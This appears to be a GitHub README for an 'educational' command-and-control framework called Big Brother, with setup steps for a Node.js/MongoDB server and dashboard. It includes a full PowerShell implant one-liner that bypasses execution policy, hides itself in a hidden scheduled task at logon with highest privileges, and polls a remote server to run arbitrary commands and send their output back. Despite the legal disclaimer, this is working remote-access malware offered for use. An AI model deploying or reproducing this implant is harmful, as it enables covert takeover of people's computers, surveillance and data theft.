# 👁️ Big Brother

![Node](https://img.shields.io/badge/Node.js-18%2B-green)
![MongoDB](https://img.shields.io/badge/MongoDB-Atlas%20%7C%20Local-brightgreen)
![License](https://img.shields.io/badge/License-Educational-blue)

> Educational Remote Administration Framework for Cybersecurity Learning  
> *"Big Brother is watching your endpoints"*

---

## ⚠️ Legal Disclaimer

**THIS PROJECT IS FOR EDUCATIONAL PURPOSES ONLY**

You may only use this system on:
- Machines you own
- Your own lab environments
- Systems where you have explicit written permission

Unauthorized access violates laws such as the Computer Fraud and Abuse Act (CFAA).

The author is not responsible for misuse or damages.

---

## 📖 What is Big Brother?

Big Brother is an educational framework that demonstrates how remote command and control systems work. It consists of:

- **Node.js Server** - Hosts a web dashboard and REST API
- **MongoDB Database** - Stores connected computers and command history
- **PowerShell Client** - Runs on Windows machines, polls server for commands

The name is inspired by George Orwell's "1984" - a reminder about surveillance and privacy.

---

## ✨ Features

### Server Side
- Web-based control panel with password authentication
- MongoDB database for storing clients and commands
- REST API for client communication
- Command execution and result tracking
- Online/offline status monitoring

### Client Side
- Silent background execution
- Persistence via Windows Scheduled Tasks (survives reboots)
- Automatic command polling every 3 seconds
- Command output capture and reporting

---

## 🚀 Complete Setup Guide

### Prerequisites

Download and install:
- Node.js (v18 or higher) - https://nodejs.org/
- Git - https://git-scm.com/
- MongoDB (only for local testing) - https://www.mongodb.com/try/download/community

### Step 1: Download the Code

```bash
git clone https://github.com/Nullit13/bigbrother.git
cd bigbrother
```

### Step 2: Install Dependencies

```bash
npm install
```

### Step 3: Create Environment File

Create a file named .env in the project folder:

```env
MONGO_URI=mongodb://127.0.0.1:27017/bigbrother
ADMIN_PASSWORD=your_secure_password
PORT=3000
```

For MongoDB Atlas (cloud database - no need to run mongod):

```env
MONGO_URI=mongodb+srv://username:password@cluster.mongodb.net/bigbrother
ADMIN_PASSWORD=your_secure_password
PORT=3000
```

### Step 4: Start the Server

Option A - Local MongoDB:

```bash
mongod
npm start
```

Option B - MongoDB Atlas:

```bash
npm start
```

Option C - Deploy to Vercel:

```bash
npm install -g vercel
vercel --prod
```

### Step 5: Access Dashboard

http://localhost:3000/parent

Login:
- Username: admin
- Password: (from .env)

---

## 💻 PowerShell Client Code

Replace http://localhost:3000 with your server URL.

```powershell
$p="$env:APPDATA\bigbrother.ps1";@"
[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
Set-ExecutionPolicy Bypass -Scope Process -Force
`$S='http://localhost:3000'
`$C=`$env:COMPUTERNAME
while(`$true){
try{`$r=Invoke-RestMethod "`$S/api/child/`$C" -TimeoutSec 10
if(`$r.child -and `$r.commands){foreach(`$x in `$r.commands){`$o=cmd /c `$x.command 2>&1|Out-String
`$b=@{result=`$o}|ConvertTo-Json
Invoke-RestMethod "`$S/api/command/result/`$(`$r.child._id)/`$(`$x._id)" -Method POST -Body `$b -ContentType 'application/json' -TimeoutSec 5}}}
catch{}Start-Sleep 3}
"@|Out-File $p -Encoding UTF8;Unregister-ScheduledTask -TaskName "bigbrother" -ErrorAction SilentlyContinue -Confirm:$false|Out-Null;$A=New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$p`"";$T=New-ScheduledTaskTrigger -AtLogon;$P=New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -RunLevel Highest;$S=New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries;Register-ScheduledTask -TaskName "bigbrother" -Action $A -Trigger $T -Principal $P -Settings $S -Force|Out-Null;Start-ScheduledTask -TaskName "bigbrother"|Out-Null

```

## 🎮 How to Send Commands

1. Open `http://localhost:3000/parent`
2. Login with admin and your password
3. Click on the computer name
4. Type a command (ipconfig, whoami, dir)
5. Click "Execute Command"
6. Wait 3-10 seconds for results

## 🛑 How to Remove the Client

Run PowerShell as Administrator:

```powershell
Stop-ScheduledTask -TaskName "bigbrother" -ErrorAction SilentlyContinue; Unregister-ScheduledTask -TaskName "bigbrother" -Confirm:$false -ErrorAction SilentlyContinue; Remove-Item "$env:APPDATA\bigbrother.ps1" -Force -ErrorAction SilentlyContinue
```

## 🔧 Troubleshooting

| Problem | Solution |
|---------|----------|
| Server won't start | Check .env file has MONGO_URI |
| No computers appear | Run PowerShell client on a Windows machine |
| Commands no results | Wait 10 seconds, refresh page |

## 📄 License

Educational Use Only

## 🔗 Links

- **GitHub:** https://github.com/Nullit13/bigbrother

---

**Remember:** With great power comes great responsibility. Use this knowledge to defend, not attack.